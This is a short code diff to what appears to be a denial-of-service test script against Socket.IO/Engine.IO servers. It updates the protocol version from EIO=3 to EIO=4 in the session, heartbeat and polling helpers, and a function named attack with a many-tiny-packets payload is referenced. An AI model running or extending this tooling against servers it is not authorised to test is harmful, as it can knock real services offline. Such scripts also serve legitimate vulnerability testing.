@@ -75,7 +75,7 @@ def timestr():
 
 
 def get_new_session_url(host, path, timeout=DEFAULT_TIMEOUT, headers=None):
-    base_url = f"{host}/{path}?EIO=3&transport=polling"
+    base_url = f"{host}/{path}?EIO=4&transport=polling"
     # Create session
     response = requests.get(
         base_url + timestr(),
@@ -109,7 +109,7 @@ def attack(host, payload_length=DEFAULT_MAX, make_payload=many_tiny_packets, pat
 
 
 def send_one_heartbeat(host, sid, path=DEFAULT_PATH):
-    session_url = f"{host}/{path}?EIO=3&transport=polling&sid={sid}"
+    session_url = f"{host}/{path}?EIO=4&transport=polling&sid={sid}"
     final_response = requests.post(
         session_url + timestr(),
         data='1:2',
@@ -119,7 +119,7 @@ def send_one_heartbeat(host, sid, path=DEFAULT_PATH):
 
 
 def get_responses(host, sid, path=DEFAULT_PATH):
-    session_url = f"{host}/{path}?EIO=3&transport=polling&sid={sid}"
+    session_url = f"{host}/{path}?EIO=4&transport=polling&sid={sid}"
     final_response = requests.get(
         session_url + timestr(),
     ).text
